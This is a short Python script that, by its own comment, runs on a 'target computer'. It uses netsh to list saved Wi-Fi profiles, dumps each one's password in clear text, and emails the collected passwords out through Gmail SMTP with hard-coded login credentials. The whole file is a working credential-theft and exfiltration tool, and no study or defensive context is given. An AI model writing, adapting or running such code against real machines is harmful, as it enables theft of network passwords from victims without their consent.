#!/usr/bin/env python
import subprocess
import smtplib
import re


email = "email@example.com"
password = "superSecretPassword"
smtp_server = "smtp.gmail.com"
smtp_server_port = 587


def send_mail():
    server = smtplib.SMTP(smtp_server, smtp_server_port)
    server.starttls()
    server.login(email, password)
    server.sendmail(email, email, result)
    server.quit()


# The command you want to execute on the target computer
command = "netsh wlan show profile"

networks = subprocess.check_output(command, shell=True)
network_names_list = re.findall("(?:Profile\s*:\s)(.*)", networks)
result = ""
for network_name in network_names_list:
    command = "netsh wlan show profile " + network_name + " key=clear"
    current_result = subprocess.check_output(command, shell=True)
    result = result + current_result

send_mail()
